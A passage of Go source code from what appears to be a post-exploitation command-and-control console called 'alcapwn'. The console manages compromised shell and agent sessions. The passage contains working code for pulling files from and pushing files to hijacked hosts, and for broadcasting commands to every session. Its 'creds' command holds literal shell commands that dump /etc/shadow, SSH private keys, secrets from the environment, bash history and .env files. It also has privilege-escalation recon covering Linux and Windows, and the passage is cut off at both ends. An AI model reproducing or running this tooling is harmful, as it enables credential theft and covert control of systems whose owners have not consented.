		fmt.Printf("[!] Failed to send command: %v\n", err)
		return
	}

	// Read output until bash prompt.
	output, err := u.readUntilPrompt(10 * time.Second)
	if err != nil {
		fmt.Printf("[!] Failed to read file: %v\n", err)
		return
	}
	u.clearDeadline()

	// Strip prompts and split into lines.
	clean := u.StripPrompts(output)
	lines := strings.Split(clean, "\n")

	// Extract base64 data — exact-line sentinel matching skips the command echo.
	const dlStart = "ALCAPWN_DL_START"
	const dlEnd = "ALCAPWN_DL_END"
	var b64Parts []string
	inCapture := false
	for _, ln := range lines {
		t := strings.TrimSpace(ln)
		if t == dlStart {
			inCapture = true
			continue
		}
		if t == dlEnd {
			break
		}
		if inCapture && t != "" {
			b64Parts = append(b64Parts, t)
		}
	}
	b64Data := strings.Join(b64Parts, "")

	if b64Data == "" {
		fmt.Println("[!] Failed to extract file data")
		return
	}

	// Decode base64 (base64 utility uses standard encoding with line wrapping)
	data, err := base64.StdEncoding.DecodeString(b64Data)
	if err != nil {
		fmt.Printf("[!] Failed to decode file: %v\n", err)
		return
	}

	// Create parent directories if needed
	dir := filepath.Dir(absLocal)
	if err := os.MkdirAll(dir, 0755); err != nil {
		fmt.Printf("[!] Failed to create directory: %v\n", err)
		return
	}

	// Write file
	if err := os.WriteFile(absLocal, data, 0644); err != nil {
		fmt.Printf("[!] Failed to write file: %v\n", err)
		return
	}

	fmt.Printf("[*] Downloaded %s (%d bytes) to %s\n", remotePath, len(data), localPath)
}

// cmdUpload uploads a file from the local machine to the remote session.
// Usage: upload <id> <local_path> [remote_path]
func (c *Console) cmdUpload(args []string) {
	if len(args) < 2 {
		fmt.Println("[!] Usage: upload <id> <local_path> [remote_path]")
		return
	}
	id, err := strconv.Atoi(args[0])
	if err != nil || id < 1 {
		fmt.Printf("[!] Invalid session ID: %s\n", args[0])
		return
	}

	localPath := args[1]

	// Determine remote path
	var remotePath string
	if len(args) > 2 {
		remotePath = args[2]
	} else {
		// Default: upload to /tmp/
		remotePath = "/tmp/" + filepath.Base(localPath)
	}

	// Security: local path must exist and be a file
	info, err := os.Stat(localPath)
	if err != nil {
		fmt.Printf("[!] Local file not found: %v\n", err)
		return
	}
	if info.IsDir() {
		fmt.Println("[!] Cannot upload directories - use a directory path on remote side")
		return
	}

	// Read local file
	data, err := os.ReadFile(localPath)
	if err != nil {
		fmt.Printf("[!] Failed to read local file: %v\n", err)
		return
	}

	// Security: remote path must be under certain safe locations
	// We allow any remote path, but log a warning for sensitive locations
	sensitiveLocations := []string{"/etc/", "/root/", "/home/", "/var/", "/usr/"}
	isSensitive := false
	for _, loc := range sensitiveLocations {
		if strings.HasPrefix(remotePath, loc) {
			isSensitive = true
			break
		}
	}
	if isSensitive {
		fmt.Printf("[!] Warning: Uploading to sensitive location: %s\n", remotePath)
	}

	sess := c.registry.Get(id)
	if sess == nil {
		fmt.Printf("[!] No session with ID %d.\n", id)
		return
	}

	sess.mu.Lock()
	if sess.State == SessionStateInteractive {
		sess.mu.Unlock()
		fmt.Printf("[!] Session %d is currently active — background it first.\n", id)
		return
	}
	if sess.State == SessionStateTerminated {
		sess.mu.Unlock()
		fmt.Printf("[!] Session %d has been terminated.\n", id)
		return
	}

	// Agent sessions: use structured file transfer.
	if sess.IsAgent {
		sess.mu.Unlock()
		fmt.Printf("[*] Uploading %s → %s on session %d...\n", localPath, remotePath, id)
		if ulErr := agentUpload(sess, remotePath, data); ulErr != nil {
			fmt.Printf("[!] Upload failed: %v\n", ulErr)
			return
		}
		fmt.Printf("[+] Uploaded %d bytes to %s\n", len(data), remotePath)
		return
	}

	if sess.Upgrader == nil {
		sess.mu.Unlock()
		fmt.Printf("[!] Session %d is still initializing — try again in a moment.\n", id)
		return
	}
	u := sess.Upgrader
	drainWasRunning := sess.drainStop != nil
	conn := sess.ActiveConn
	if conn == nil {
		conn = sess.Conn
	}
	sess.mu.Unlock()

	u.clearDeadline()
	c.stopDrain(sess)
	defer func() {
		if drainWasRunning {
			c.startDrain(sess, conn)
		}
	}()

	// Encode file as base64
	b64Data := base64.StdEncoding.EncodeToString(data)

	// Use python3 -c "..." to write the file.  The script is passed as a
	// shell double-quoted argument (Go %q escapes embedded ") so there is
	// no heredoc echo and the command stays within the PTY line-width limit.
	// b64Data may be long; break it into a fixed-length shell variable via
	// printf to stay well under 220 cols.
	pyScript := fmt.Sprintf(
		`import base64;open(%q,"wb").write(base64.b64decode(%q));print("UPLOAD_OK:%d")`,
		remotePath, b64Data, len(data))
	// Append a shell-level sentinel so we can read until it rather than relying
	// on readUntilPrompt (which can return early if a residual bash prompt is
	// in the TCP receive buffer).  ALCAPWN_UL_DONE is not part of the Python
	// source, so it only appears as the output of the trailing echo command,
	// not in the command-echo text.
	cmdStr := fmt.Sprintf("python3 -c %q; echo ALCAPWN_UL_DONE\n", pyScript)
	if err := u.write(cmdStr); err != nil {
		fmt.Printf("[!] Failed to send command: %v\n", err)
		return
	}

	raw, _ := u.readUntilSentinel("ALCAPWN_UL_DONE", 10*time.Second)
	u.clearDeadline()

	// Check result
	switch {
	case strings.Contains(raw, "UPLOAD_OK:"):
		fmt.Printf("[*] Uploaded %s (%d bytes) to %s\n", localPath, len(data), remotePath)
	case strings.Contains(raw, "UPLOAD_ERR:"):
		for _, ln := range strings.Split(raw, "\n") {
			if strings.Contains(ln, "UPLOAD_ERR:") {
				fmt.Println(stripDangerousAnsi(strings.TrimSpace(ln)))
				break
			}
		}
	default:
		fmt.Printf("[*] Upload completed\n")
	}
}

func (c *Console) cmdExport(args []string) {
	// Usage: export <id|all> [--format json|txt] [path]
	if len(args) == 0 {
		fmt.Println("[!] Usage: export <id|all> [--format json|txt] [path]")
		return
	}

	format := "json"
	var remaining []string
	for i := 0; i < len(args); i++ {
		if args[i] == "--format" && i+1 < len(args) {
			format = strings.ToLower(args[i+1])
			i++
		} else {
			remaining = append(remaining, args[i])
		}
	}
	if format != "json" && format != "txt" {
		fmt.Printf("[!] Unknown format '%s'. Use: json, txt\n", format)
		return
	}
	if len(remaining) == 0 {
		fmt.Println("[!] Usage: export <id|all> [--format json|txt] [path]")
		return
	}

	// export all — iterate every session with findings
	if remaining[0] == "all" {
		sessions := c.registry.All()
		if len(sessions) == 0 {
			fmt.Println("[*] No active sessions.")
			return
		}
		dir := c.opts.findingsDir
		if len(remaining) >= 2 {
			dir = remaining[1]
		}
		if dir == "" {
			dir = "."
		}
		if err := os.MkdirAll(dir, 0700); err != nil {
			fmt.Printf("[!] Could not create directory: %v\n", err)
			return
		}
		count := 0
		for _, sess := range sessions {
			sess.mu.Lock()
			findings := sess.Findings
			matches := sess.Matches
			remote := sess.RemoteAddr
			label := sess.Label
			sessID := sess.ID
			sess.mu.Unlock()
			if findings == nil {
				continue
			}
			host := label
			if host == "" {
				host = remote
				if h, _, err := net.SplitHostPort(remote); err == nil {
					host = h
				}
				host = sanitizeLabel(strings.ReplaceAll(host, ".", "_"))
			}
			ts := time.Now().Format("20060102_150405")
			outPath := filepath.Join(dir, fmt.Sprintf("findings_%d_%s_%s.%s", sessID, host, ts, format))
			if err := writeExport(outPath, format, findings, matches); err != nil {
				fmt.Printf("[!] Session %d: %v\n", sessID, err)
				continue
			}
			fmt.Printf("[*] Session %d → %s\n", sessID, outPath)
			count++
		}
		fmt.Printf("[*] Exported %d session(s).\n", count)
		return
	}

	// Single session export
	id, err := strconv.Atoi(remaining[0])
	if err != nil || id < 1 {
		fmt.Printf("[!] Invalid session ID: %s\n", remaining[0])
		return
	}
	sess := c.registry.Get(id)
	if sess == nil {
		fmt.Printf("[!] No session with ID %d.\n", id)
		return
	}

	sess.mu.Lock()
	findings := sess.Findings
	matches := sess.Matches
	remote := sess.RemoteAddr
	label := sess.Label
	sess.mu.Unlock()

	if findings == nil {
		fmt.Printf("[!] Recon still running for session %d — no findings to export yet.\n", id)
		return
	}

	var outPath string
	if len(remaining) >= 2 {
		outPath = remaining[1]
	} else {
		host := label
		if host == "" {
			host = remote
			if h, _, splitErr := net.SplitHostPort(remote); splitErr == nil {
				host = h
			}
			host = sanitizeLabel(strings.ReplaceAll(host, ".", "_"))
		}
		ts := time.Now().Format("20060102_150405")
		dir := c.opts.findingsDir
		if dir == "" {
			dir = "."
		}
		if err := os.MkdirAll(dir, 0700); err != nil {
			fmt.Printf("[!] Could not create directory: %v\n", err)
			return
		}
		outPath = filepath.Join(dir, fmt.Sprintf("findings_%s_%s.%s", host, ts, format))
	}

	if err := writeExport(outPath, format, findings, matches); err != nil {
		fmt.Printf("[!] Export error: %v\n", err)
		return
	}
	fmt.Printf("[*] Exported to %s\n", outPath)
}

// writeExport serialises findings to outPath in the requested format.
func writeExport(outPath, format string, findings *Findings, matches []MatchResult) error {
	var data []byte
	var err error
	switch format {
	case "txt":
		data = []byte(findingsToText(findings, matches))
	default: // json
		data, err = json.MarshalIndent(findings, "", "  ")
		if err != nil {
			return err
		}
	}
	return os.WriteFile(outPath, data, 0600)
}

// findingsToText produces a human-readable plain-text report from findings and
// their matched privesc entries.  Mirrors printSummary output without ANSI.
func findingsToText(f *Findings, matches []MatchResult) string {
	var b strings.Builder

	hostname := "unknown"
	if f.Hostname != nil {
		hostname = *f.Hostname
	}
	user := "unknown"
	if f.User != nil {
		user = *f.User
	}
	uid := "unknown"
	if f.UID != nil {
		uid = *f.UID
	}
	osInfo := "unknown"
	if f.OS != nil {
		osInfo = *f.OS
	}
	kernel := "unknown"
	if f.KernelVersion != nil {
		kernel = *f.KernelVersion
	}

	sep := strings.Repeat("=", 60)
	fmt.Fprintf(&b, "%s\n", sep)
	fmt.Fprintf(&b, "ALCAPWN FINDINGS REPORT\n")
	fmt.Fprintf(&b, "Host: %s | User: %s (uid=%s)\n", hostname, user, uid)
	fmt.Fprintf(&b, "OS: %s | Kernel: %s\n", osInfo, kernel)
	fmt.Fprintf(&b, "Generated: %s\n", time.Now().Format("2006-01-02 15:04:05"))
	fmt.Fprintf(&b, "%s\n", sep)

	if len(matches) > 0 {
		fmt.Fprintf(&b, "\n[PRIVESC MATCHES]\n")
		for _, m := range matches {
			conf := strings.ToUpper(m.MatchConfidence)
			cve := ""
			if m.Entry.CVE != nil {
				cve = *m.Entry.CVE
			}
			binary := ""
			if m.Entry.Binary != nil {
				binary = *m.Entry.Binary
			}
			if cve != "" {
				fmt.Fprintf(&b, "  [%s] %s — %s\n", conf, cve, m.Entry.ID)
			} else if binary != "" {
				fmt.Fprintf(&b, "  [%s] %s: %s\n", conf, m.Entry.Category, binary)
			} else {
				exploit := ""
				if len(m.Entry.Exploitation) > 0 {
					exploit = m.Entry.Exploitation[0]
				}
				fmt.Fprintf(&b, "  [%s] %s: %s\n", conf, m.Entry.Category, exploit)
			}
		}
		if len(matches[0].Entry.Exploitation) > 0 {
			fmt.Fprintf(&b, "\n  Suggested path: %s\n", matches[0].Entry.Exploitation[0])
		}
	} else {
		fmt.Fprintf(&b, "\n[NO PRIVESC MATCHES]\n")
	}

	if len(f.SudoNopasswd) > 0 {
		fmt.Fprintf(&b, "\n[SUDO NOPASSWD] %d entries\n", len(f.SudoNopasswd))
		for _, e := range f.SudoNopasswd {
			neg := ""
			if e.NegatedRoot {
				neg = " (!root)"
			}
			fmt.Fprintf(&b, "  %s: %s%s\n", e.User, e.Command, neg)
		}
	}
	if len(f.SuidBinaries) > 0 {
		fmt.Fprintf(&b, "\n[SUID BINARIES] %d found\n", len(f.SuidBinaries))
		for _, p := range f.SuidBinaries {
			fmt.Fprintf(&b, "  %s\n", p)
		}
	}
	if len(f.SgidBinaries) > 0 {
		fmt.Fprintf(&b, "\n[SGID BINARIES] %d found\n", len(f.SgidBinaries))
		for _, p := range f.SgidBinaries {
			fmt.Fprintf(&b, "  %s\n", p)
		}
	}
	if len(f.Capabilities) > 0 {
		fmt.Fprintf(&b, "\n[FILE CAPABILITIES] %d\n", len(f.Capabilities))
		for _, cap := range f.Capabilities {
			fmt.Fprintf(&b, "  %s: %s\n", cap.File, cap.Capability)
		}
	}
	if len(f.CveCandidates) > 0 {
		fmt.Fprintf(&b, "\n[CVE CANDIDATES] %d\n", len(f.CveCandidates))
		for _, cve := range f.CveCandidates {
			fmt.Fprintf(&b, "  %s: %s (%s)\n", cve.CVE, cve.Name, cve.Confidence)
		}
	}
	if len(f.WritableCrons) > 0 {
		fmt.Fprintf(&b, "\n[WRITABLE CRON SCRIPTS] %d\n", len(f.WritableCrons))
		for _, p := range f.WritableCrons {
			fmt.Fprintf(&b, "  %s\n", p)
		}
	}
	if len(f.InterestingFiles) > 0 {
		fmt.Fprintf(&b, "\n[INTERESTING FILES] %d\n", len(f.InterestingFiles))
		for _, p := range f.InterestingFiles {
			fmt.Fprintf(&b, "  %s\n", p)
		}
	}
	if f.AWSCredentialsFound {
		fmt.Fprintf(&b, "\n[AWS CREDENTIALS] FOUND\n")
	}
	if f.MySQLConfigFound {
		fmt.Fprintf(&b, "\n[MYSQL CONFIG] FOUND\n")
	}
	if f.ContainerDetected {
		vt := "unknown"
		if f.VirtualizationType != nil {
			vt = *f.VirtualizationType
		}
		fmt.Fprintf(&b, "\n[CONTAINER DETECTED] %s\n", vt)
	}
	if f.DockerSocketAccessible && f.DockerSocket != nil {
		fmt.Fprintf(&b, "\n[DOCKER SOCKET] ACCESSIBLE: %s\n", *f.DockerSocket)
	}
	if len(f.ToolsAvailable) > 0 {
		fmt.Fprintf(&b, "\n[TOOLS] %s\n", strings.Join(f.ToolsAvailable, ", "))
	}
	sv := f.ServiceVersions
	var svcs []string
	if sv.Apache != nil {
		svcs = append(svcs, "apache="+*sv.Apache)
	}
	if sv.Nginx != nil {
		svcs = append(svcs, "nginx="+*sv.Nginx)
	}
	if sv.PHP != nil {
		svcs = append(svcs, "php="+*sv.PHP)
	}
	if sv.Python != nil {
		svcs = append(svcs, "python="+*sv.Python)
	}
	if sv.Node != nil {
		svcs = append(svcs, "node="+*sv.Node)
	}
	if sv.Docker != nil {
		svcs = append(svcs, "docker="+*sv.Docker)
	}
	if sv.MySQL != nil {
		svcs = append(svcs, "mysql="+*sv.MySQL)
	}
	if sv.Postgres != nil {
		svcs = append(svcs, "postgres="+*sv.Postgres)
	}
	if sv.GitLabRunner != nil {
		svcs = append(svcs, "gitlab_runner="+*sv.GitLabRunner)
	}
	if len(svcs) > 0 {
		fmt.Fprintf(&b, "\n[SERVICE VERSIONS] %s\n", strings.Join(svcs, ", "))
	}

	fmt.Fprintf(&b, "\n%s\n", sep)
	return b.String()
}

// cmdCreds harvests credentials from a backgrounded session: shadow file,
// SSH private keys, environment secrets, bash history, and .env files.
// Results are stored on the session (visible via 'info') and optionally
// written to a file.
// Usage: creds <id> [path]
func (c *Console) cmdCreds(args []string) {
	if len(args) == 0 {
		fmt.Println("[!] Usage: creds <id> [path]")
		return
	}
	id, err := strconv.Atoi(args[0])
	if err != nil || id < 1 {
		fmt.Printf("[!] Invalid session ID: %s\n", args[0])
		return
	}
	var outPath string
	if len(args) >= 2 {
		outPath = args[1]
	}

	sess := c.registry.Get(id)
	if sess == nil {
		fmt.Printf("[!] No session with ID %d.\n", id)
		return
	}

	sess.mu.Lock()
	if sess.State == SessionStateInteractive {
		sess.mu.Unlock()
		fmt.Printf("[!] Session %d is currently active — background it first.\n", id)
		return
	}
	if sess.State == SessionStateTerminated {
		sess.mu.Unlock()
		fmt.Printf("[!] Session %d has been terminated.\n", id)
		return
	}
	isAgent := sess.IsAgent
	sess.mu.Unlock()

	// Agent sessions: use TaskCreds (pure Go file reads, no PTY required).
	if isAgent {
		c.cmdCredsAgent(sess, outPath)
		return
	}

	sess.mu.Lock()
	if sess.Upgrader == nil {
		sess.mu.Unlock()
		fmt.Printf("[!] Session %d is still initializing — try again in a moment.\n", id)
		return
	}
	u := sess.Upgrader
	drainWasRunning := sess.drainStop != nil
	conn := sess.ActiveConn
	if conn == nil {
		conn = sess.Conn
	}
	sess.mu.Unlock()

	u.clearDeadline()
	c.stopDrain(sess)
	defer func() {
		if drainWasRunning {
			c.startDrain(sess, conn)
		}
	}()

	type credCheck struct {
		label string
		cmd   string
	}
	checks := []credCheck{
		{
			"SHADOW FILE",
			`cat /etc/shadow 2>/dev/null || echo '[not accessible]'`,
		},
		{
			"SSH PRIVATE KEYS",
			`for f in ~/.ssh/id_rsa ~/.ssh/id_ed25519 ~/.ssh/id_ecdsa ~/.ssh/id_dsa; do [ -r "$f" ] && { echo "=== $f ==="; cat "$f"; }; done 2>/dev/null; echo '[done]'`,
		},
		{
			"ENV SECRETS",
			`env 2>/dev/null | grep -iE '(password|passwd|secret|token|api_key|apikey|access_key)' || echo '[none found]'`,
		},
		{
			"BASH HISTORY",
			`cat ~/.bash_history 2>/dev/null | tail -30 || echo '[not readable]'`,
		},
		{
			".ENV FILES",
			`find /var/www /opt /home -maxdepth 4 -name '.env' -readable 2>/dev/null | head -5 | while read f; do echo "=== $f ==="; cat "$f"; done; echo '[done]'`,
		},
	}

	fmt.Printf("[*] Harvesting credentials from session %d...\n", id)
	var buf strings.Builder
	for _, check := range checks {
		fmt.Printf("\n─── %s ───\n", check.label)
		fmt.Fprintf(&buf, "\n─── %s ───\n", check.label)
		if err := u.write(check.cmd + "\n"); err != nil {
			fmt.Printf("[!] Failed to send command: %v\n", err)
			return
		}
		output, err := u.readUntilPrompt(8 * time.Second)
		if err != nil {
			fmt.Println("[!] Timeout reading output")
			continue
		}
		clean := u.StripPrompts(output)
		lines := strings.Split(clean, "\n")
		if len(lines) > 0 && strings.TrimSpace(lines[0]) == strings.TrimSpace(check.cmd) {
			lines = lines[1:]
		}
		clean = strings.TrimRight(strings.Join(lines, "\n"), "\r\n\t ")
		if clean != "" {
			fmt.Println(stripDangerousAnsi(clean))
			fmt.Fprintln(&buf, stripDangerousAnsi(clean))
		}
	}
	fmt.Println()

	result := buf.String()

	// Store on session so 'info' can display it.
	sess.mu.Lock()
	sess.HarvestedCreds = &result
	sess.mu.Unlock()

	// Optionally write to file.
	if outPath != "" {
		if err := os.WriteFile(outPath, []byte(result), 0600); err != nil {
			fmt.Printf("[!] Failed to save creds: %v\n", err)
		} else {
			fmt.Printf("[*] Creds saved to %s\n", outPath)
		}
	}
}

// cmdRecon manually triggers the recon pipeline on a backgrounded session.
// Useful when alcapwn was started without --recon or when re-running recon
// after system changes.
func (c *Console) cmdRecon(args []string) {
	if len(args) == 0 {
		fmt.Println("[!] Usage: recon <id>")
		return
	}
	id, err := strconv.Atoi(args[0])
	if err != nil || id < 1 {
		fmt.Printf("[!] Invalid session ID: %s\n", args[0])
		return
	}
	sess := c.registry.Get(id)
	if sess == nil {
		fmt.Printf("[!] No session with ID %d.\n", id)
		return
	}

	sess.mu.Lock()
	if sess.State == SessionStateInteractive {
		sess.mu.Unlock()
		fmt.Printf("[!] Session %d is currently active — background it first.\n", id)
		return
	}
	if sess.State == SessionStateTerminated {
		sess.mu.Unlock()
		fmt.Printf("[!] Session %d has been terminated.\n", id)
		return
	}

	// Handle agent sessions (non-PTY)
	if sess.IsAgent {
		sess.mu.Unlock()
		c.cmdReconAgent(sess)
		return
	}

	if sess.Upgrader == nil {
		sess.mu.Unlock()
		fmt.Printf("[!] Session %d is still initializing — try again in a moment.\n", id)
		return
	}
	u := sess.Upgrader
	drainWasRunning := sess.drainStop != nil
	conn := sess.ActiveConn
	if conn == nil {
		conn = sess.Conn
	}
	remote := sess.RemoteAddr
	sess.mu.Unlock()

	// Stop drain so recon output is not consumed and discarded.
	u.clearDeadline()
	c.stopDrain(sess)

	host := remote
	if h, _, err := net.SplitHostPort(remote); err == nil {
		host = h
	}

	fmt.Printf("[*] Running recon on session %d (%s)...\n", id, host)
	disp := newStatusDisplay()
	_, sections, err := executeRecon(
		u, c.opts.rawDir, host, disp, -1,
		time.Duration(c.opts.timeout)*time.Second, c.printer,
	)
	disp.stop()
	disp.clear()

	if err != nil {
		fmt.Printf("[!] Recon failed: %v\n", err)
		if drainWasRunning {
			c.startDrain(sess, conn)
		}
		return
	}

	u.readUntilPrompt(1 * time.Second) //nolint:errcheck

	findings := (&ReconParser{}).Parse(sections)
	matches := matchFindings(findings)

	sess.mu.Lock()
	sess.Findings = findings
	sess.Matches = matches
	sess.mu.Unlock()

	if drainWasRunning {
		c.startDrain(sess, conn)
	}

	printMatchSummary(matches, id)
	fmt.Printf("[+] Recon complete for session %d.\n", id)
}

// cmdReconAgent runs OS-specific recon on an agent session and stores findings.
func (c *Console) cmdReconAgent(sess *Session) {
	if !sess.IsAgent {
		fmt.Printf("[!] Session %d is not an agent session\n", sess.ID)
		return
	}

	sess.mu.Lock()
	isWindows := sess.AgentMeta != nil && sess.AgentMeta.OS == "windows"
	agentShell := ""
	if sess.AgentMeta != nil {
		agentShell = sess.AgentMeta.Shell
	}
	sess.mu.Unlock()

	if !isWindows && strings.Contains(agentShell, "bash") {
		// Linux + bash available: run the full structured recon script.
		c.cmdReconAgentLinux(sess)
		return
	}

	// Windows or no bash: use TaskRecon (structured JSON for Windows, basic text for others).
	fmt.Printf("[*] Running recon on agent %d...\n", sess.ID)

	res, err := agentDispatch(sess, proto.Task{
		ID:   agentTaskID("recon"),
		Kind: proto.TaskRecon,
	}, 60*time.Second)
	if err != nil {
		fmt.Printf("[!] Recon failed: %v\n", err)
		return
	}
	if res.Error != "" {
		fmt.Printf("[!] Recon error: %s\n", res.Error)
		return
	}

	if isWindows {
		var wr struct {
			Hostname    string   `json:"hostname"`
			User        string   `json:"user"`
			Domain      string   `json:"domain"`
			IsAdmin     bool     `json:"is_admin"`
			OSVersion   string   `json:"os_version"`
			Arch        string   `json:"arch"`
			Privileges  []string `json:"privileges"`
			Admins      []string `json:"admins"`
			Services    []string `json:"services"`
			Registry    []string `json:"registry_checks"`
			NetworkPorts []string `json:"network_ports"`
		}
		if err := json.Unmarshal(res.Output, &wr); err != nil {
			fmt.Printf("[!] Failed to parse Windows recon: %v\n", err)
			return
		}

		// Display summary.
		hostname := safeFindings(wr.Hostname)
		user := safeFindings(wr.User)
		domain := safeFindings(wr.Domain)
		fmt.Printf("[+] Host:       %s\n", hostname)
		fmt.Printf("[+] User:       %s\\%s\n", domain, user)
		fmt.Printf("[+] OS:         %s (%s)\n", safeFindings(wr.OSVersion), wr.Arch)
		if wr.IsAdmin {
			fmt.Printf("[!] ADMIN:      YES — user is in Administrators group\n")
		}
		if len(wr.Privileges) > 0 {
			fmt.Printf("[+] Privileges: %d token privileges found\n", len(wr.Privileges))
			for _, p := range wr.Privileges {
				fmt.Printf("    %s\n", safeFindings(p))
			}
		}
		if len(wr.Registry) > 0 {
			fmt.Printf("[+] Registry:   %d checks flagged\n", len(wr.Registry))
			for _, r := range wr.Registry {
				fmt.Printf("    %s\n", safeFindings(r))
			}
		}
		if len(wr.Admins) > 0 {
			fmt.Printf("[+] Local admins: %s\n", strings.Join(wr.Admins, ", "))
		}

		// Detect AlwaysInstallElevated from registry checks.
		aie := false
		for _, r := range wr.Registry {
			if strings.Contains(strings.ToLower(r), "alwaysinstallelevated") {
				aie = true
				break
			}
		}

		// Populate Findings and run matcher.
		osStr := wr.OSVersion
		userStr := wr.User
		hostStr := wr.Hostname
		findings := &Findings{
			Hostname:                 &hostStr,
			User:                    &userStr,
			OS:                      &osStr,
			WinPrivileges:           wr.Privileges,
			WinIsAdmin:              wr.IsAdmin,
			WinAlwaysInstallElevated: aie,
			WinDomain:               wr.Domain,
		}
		matches := matchFindings(findings)

		sess.mu.Lock()
		sess.Findings = findings
		sess.Matches = matches
		sess.mu.Unlock()

		printMatchSummary(matches, sess.ID)
	} else {
		// Linux/Unix: plain text output (basic info, no structured matching yet).
		fmt.Printf("%s\n", string(res.Output))
	}

	fmt.Printf("[+] Recon complete for agent %d.\n", sess.ID)
}

// cmdReconAgentLinux runs the full bash recon script on a Linux agent session
// via TaskExec and feeds the output through the standard section parser + matcher.
// This produces identical Findings/Matches to a PTY recon, enabling exploit auto.
func (c *Console) cmdReconAgentLinux(sess *Session) {
	fmt.Printf("[*] Running full bash recon on agent %d (this takes ~30–60s)...\n", sess.ID)

	// Build a nonce-tagged script so section boundaries are tamper-resistant.
	nonce := makeReconNonce()
	script := buildReconScript(nonce)
	sectionRe := buildSectionRe(nonce)

	res, err := agentDispatch(sess, proto.Task{
		ID:      agentTaskID("recon"),
		Kind:    proto.TaskExec,
		Command: script,
	}, 3*time.Minute)
	if err != nil {
		fmt.Printf("[!] Recon failed: %v\n", err)
		return
	}
	if res.Error != "" {
		fmt.Printf("[!] Recon error: %s\n", res.Error)
		return
	}

	// Clean output (no PTY noise — no PS2 prompts, no shell prompts).
	raw := stripANSI(string(res.Output))
	raw = strings.ReplaceAll(raw, "\r", "")

	sections := extractAllSections(raw, sectionRe)
	if len(sections) == 0 {
		fmt.Printf("[!] No sections parsed — bash may not have run the script. Raw output:\n%s\n",
			stripDangerousAnsi(raw[:min(len(raw), 500)]))
		return
	}

	findings := (&ReconParser{}).Parse(sections)
	matches := matchFindings(findings)

	sess.mu.Lock()
	sess.Findings = findings
	sess.Matches = matches
	sess.mu.Unlock()

	printMatchSummary(matches, sess.ID)
	fmt.Printf("[+] Recon complete for agent %d.\n", sess.ID)
}

// cmdCredsAgent harvests credentials from an agent session using TaskCreds.
func (c *Console) cmdCredsAgent(sess *Session, outPath string) {
	fmt.Printf("[*] Harvesting credentials from agent %d...\n", sess.ID)

	res, err := agentDispatch(sess, proto.Task{
		ID:   agentTaskID("creds"),
		Kind: proto.TaskCreds,
	}, 60*time.Second)
	if err != nil {
		fmt.Printf("[!] Creds harvest failed: %v\n", err)
		return
	}
	if res.Error != "" {
		fmt.Printf("[!] Creds harvest error: %s\n", res.Error)
		return
	}

	output := string(res.Output)
	fmt.Println(stripDangerousAnsi(output))

	// Store in session for 'info' display.
	sess.mu.Lock()
	sess.HarvestedCreds = &output
	sess.mu.Unlock()

	// Optionally save to file.
	if outPath != "" {
		if err := os.WriteFile(outPath, res.Output, 0600); err != nil {
			fmt.Printf("[!] Failed to write output to %s: %v\n", outPath, err)
		} else {
			fmt.Printf("[+] Saved to %s\n", outPath)
		}
	}
}

func (c *Console) cmdBroadcast(args []string) {
	if len(args) == 0 {
		fmt.Println("[!] Usage: broadcast <cmd>")
		return
	}
	cmd := strings.Join(args, " ") + "\n"
	sessions := c.registry.All()
	count := 0
	skipped := 0
	agentSkipped := 0
	for _, s := range sessions {
		s.mu.Lock()
		state := s.State
		isAgent := s.IsAgent
		conn := s.ActiveConn
		if conn == nil {
			conn = s.Conn
		}
		s.mu.Unlock()
		if isAgent {
			agentSkipped++
			continue
		}
		if state == SessionStateInteractive {
			skipped++
			continue
		}
		if conn != nil {
			conn.Write([]byte(cmd)) //nolint:errcheck
			count++
		}
	}
	if skipped > 0 || agentSkipped > 0 {
		fmt.Printf("[*] Broadcast to %d session(s) (%d interactive skipped, %d agent skipped).\n", count, skipped, agentSkipped)
	} else {
		fmt.Printf("[*] Broadcast to %d session(s).\n", count)
	}
}

// cmdTLSUpgrade upgrades a plain session to TLS.
//
// The reconnecting connection is claimed via pendingTLSUpgrade so acceptLoop
// never creates a spurious second session.  The command returns immediately
// after sending the reconnect; a background goroutine waits for the connection,
// performs the TLS handshake, and updates the session in-place.
//
// Downgrade (TLS → plain) is not supported: the Python relay has no revert
// mechanism and weakening encryption mid-session has no legitimate purpose.
func (c *Console) cmdTLSUpgrade(args []string) {
	if len(args) == 0 {
		fmt.Println("[!] Usage: tls <id>")
		return
	}
	id, err := strconv.Atoi(args[0])
	if err != nil || id < 1 {
		fmt.Printf("[!] Invalid session ID: %s\n", args[0])
		return
	}

	sess := c.registry.Get(id)
	if sess == nil {
		fmt.Printf("[!] No session with ID %d.\n", id)
		return
	}

	sess.mu.Lock()
	state := sess.State
	alreadyTLS := sess.TLS
	upgrader := sess.Upgrader
	listenerAddr := sess.ListenerAddr
	plainConn := sess.Conn
	sess.mu.Unlock()

	if alreadyTLS {
		if c.opts.tlsEnabled {
			fmt.Printf("[!] Session %d is already encrypted — alcapwn was started with --tls, TLS is mandatory on compatible sessions.\n", id)
		} else {
			fmt.Printf("[!] Session %d is already encrypted. Downgrade is not supported.\n", id)
		}
		return
	}
	if state == SessionStateInteractive {
		fmt.Printf("[!] Session %d is currently active — background it first.\n", id)
		return
	}
	if state == SessionStateTerminated {
		fmt.Printf("[!] Session %d has been terminated.\n", id)
		return
	}
	if upgrader == nil {
		fmt.Printf("[!] Session %d is still initializing — try again in a moment.\n", id)
		return
	}

	// Lazily generate an ephemeral TLS cert if --tls wasn't set at startup.
	if c.opts.tlsCfg == nil {
		if c.opts.verbosity >= 1 {
			fmt.Println("[*] Generating ephemeral TLS certificate...")
		}
		tlsCfg, fp, genErr := generateEphemeralTLSConfig()
		if genErr != nil {
			fmt.Printf("[!] Failed to generate TLS certificate: %v\n", genErr)
			return
		}
		c.opts.tlsCfg = tlsCfg
		c.opts.fingerprint = fp
		c.opts.fingerprintHex = strings.ToLower(strings.ReplaceAll(fp, ":", ""))
		if c.opts.verbosity >= 1 {
			fmt.Printf("[*] Ephemeral cert fingerprint: %s\n", fp)
		}
	}

	// Stop any drain goroutine before we read/write plainConn for detection and
	// the reconnect command.  The drain goroutine competes with upgrader.reader
	// on the same socket — if it steals the ALCAPWN_PYEND sentinel bytes,
	// detectPythonBin will time out and the upgrade silently fails.
	c.stopDrain(sess)

	// Python is needed on the remote to run the TLS relay.  detectPythonBin()
	// skips detection when tlsMode was false at session-open time, so call it
	// explicitly here.
	if !upgrader.usedPython {
		if c.opts.verbosity >= 1 {
			fmt.Printf("[*] Detecting Python on session %d...\n", id)
		}
		// Give the shell a moment to settle before sending the Python check command
		time.Sleep(200 * time.Millisecond)
		upgrader.detectPythonBin()
		if !upgrader.usedPython {
			fmt.Printf("[!] No Python available on session %d — cannot upgrade to TLS.\n", id)
			return
